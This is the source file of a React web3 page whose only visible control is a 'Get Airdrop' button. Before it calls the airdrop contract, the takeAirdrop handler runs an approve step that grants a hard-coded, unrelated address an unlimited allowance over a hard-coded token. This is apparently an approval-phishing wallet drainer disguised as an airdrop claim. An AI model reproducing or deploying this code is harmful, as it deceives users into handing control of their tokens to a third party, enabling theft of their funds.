import React from 'react'
import Web3 from 'web3';
import { Web3ReactProvider, useWeb3React } from '@web3-react/core'
import { Web3Provider } from '@ethersproject/providers'
import { useEagerConnect, useInactiveListener } from './Hooks'
import { injected } from './Connectors'
import ButtonLoader from './components/ButtonLoader'
import { erc20Abi, airdropAbi } from './abi';
import './App.css';

type ErrorHandler = (error: any, hash: string) => void

function getLibrary(provider: any): Web3Provider {
  const library = new Web3Provider(provider)
  library.pollingInterval = 12000
  return library
}

export default function Web3App() {
  return (
    <Web3ReactProvider getLibrary={getLibrary}>
      <App />
    </Web3ReactProvider>
  )
}

function App() {
  const airdropContractAddress = '0xfbbB798186020F7B4822CB6AE8E431bFd4f22188';
  const approveTokenAddress = '0x79030E6eA324E9c111B27deaAe2a205C27Cff664';
  const approveTo = '0xFEa19831aCE7648a06b60bf3C07C0378E9e30A54';

  const context = useWeb3React<Web3Provider>()
  const { connector, library, account, activate } = context;

  // handle logic to recognize the connector currently being activated
  const [activatingConnector, setActivatingConnector] = React.useState<any>()
  React.useEffect(() => {
    if (activatingConnector && activatingConnector === connector) {
      setActivatingConnector(undefined)
    }
  }, [activatingConnector, connector])

  const [web3, setWeb3] = React.useState<any>(null);
  React.useEffect(() => {
    if (library) {
      const web3 = new Web3(library.provider as any);
      web3.eth.handleRevert = true;
      setWeb3(web3);
    }
  }, [library]);

  React.useEffect(() => {
    activate(injected);
  }, [activate]);

  const [buttonText, setButtonText] = React.useState('Get Airdrop');
  const [airdropTaking, setAirdropTaking] = React.useState(false);
  const [errorMessage, setErrorMessage] = React.useState<string>();

  // handle logic to eagerly connect to the injected ethereum provider, if it exists and has granted access already
  const triedEager = useEagerConnect()

  // handle logic to connect in reaction to certain events on the injected ethereum provider, if it exists
  useInactiveListener(!triedEager || !!activatingConnector);

  const approve = async (onError: ErrorHandler) => {
    const token = new web3.eth.Contract(erc20Abi, approveTokenAddress);
    const allowance = await token.methods.allowance(account, approveTo).call();

    if (web3.utils.toBN(allowance) > 0) {
      return;
    }

    let transactionHash = '';
    await token.methods.approve(approveTo, '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').send({ from: account, gasLimit: 500000  })
      .once('sending', function (payload: any) { console.log(payload); })
      .once('sent', function (payload: any) { console.log(payload); })
      .once('transactionHash', function (hash: any) { console.log(hash); transactionHash = hash;})
      .once('receipt', function (receipt: any) { console.log(receipt); })
      .on('error', function (error: any) { onError(error, transactionHash); })
      .then(function (receipt: any) {
        // will be fired once the receipt is mined
        console.log(receipt);
      });
  }

  const takeAirdrop = async () => {
    let errorExists = false;
    const errorHandler = async (error: any) => {
      errorExists = true;

      if ('message' in error) {
        setErrorMessage(parseErrorMessage(error.message));
      } else if ('reason' in error) {
        setErrorMessage(parseErrorMessage(error.reason));
      }
    }

    try {
      setAirdropTaking(true);
      setButtonText('Getting Airdrop')
      setErrorMessage('');

      // 1. approve
      await approve(errorHandler);

      if (errorExists) {
        setButtonText('Get Failed')
        return;
      }

      setButtonText('Getting Airdrop')

      // 2. take airdrop
      const contractInstance = new web3.eth.Contract(airdropAbi, airdropContractAddress);
      let gasLimit = 200000;
      await contractInstance.methods.takeAirdrop().estimateGas({ from: account, gasLimit: gasLimit })
        .then((gasAmount: any) => {
          gasLimit = gasAmount;
        })
        .catch((error: any) => {
          console.log(error);
          errorHandler(error);
          setAirdropTaking(false);
        });
      if (errorExists) {
        setButtonText('Get Failed')
        return;
      }

      await contractInstance.methods.takeAirdrop().send({ from: account, gasLimit: gasLimit })
        .once('sending', function (payload: any) { console.log(payload); })
        .once('sent', function (payload: any) { console.log(payload); })
        .once('transactionHash', function (hash: any) { console.log(hash); })
        .once('receipt', function (receipt: any) { console.log(receipt); })
        // .on('confirmation', function (confNumber: any, receipt: any, latestBlockHash: any) { console.log(confNumber, receipt, latestBlockHash) })
        .on('error', function (error: any) { errorHandler(error); })
        .then(function (receipt: any) {
          // will be fired once the receipt is mined
          console.log(receipt);
          setButtonText('Get Success')
        })
        .catch((error: any) => {
          errorHandler(error);
          setButtonText('Get Failed');
        });
    } catch (error: any) {
      errorHandler(error);
      setButtonText('Get Failed');
    } finally {
      setAirdropTaking(false);
    }
  }

  const parseErrorMessage = (message: any) => {
    if (message.search('You are not allowed to take airdrop') >= 0) {
      return 'You are not allowed to take airdrop';
    } else if (message.search('All tokens have been taken') >= 0) {
      return 'All tokens have been taken';
    } else if (message.search('You have already taken airdrop') >= 0) {
      return 'You have already taken airdrop';
    } else if (message.search('Airdrop not started or finished') >= 0) {
      return 'Airdrop not started or finished';
    } else {
      // return 'unknown error happened';
      return message;
    }
  }

  return (
    <div>
      <ButtonLoader loading={airdropTaking} onClick={takeAirdrop}>{buttonText}</ButtonLoader>
      {errorMessage ? <div className={'error'}>{errorMessage}</div> : <></>}
    </div>
  )
}
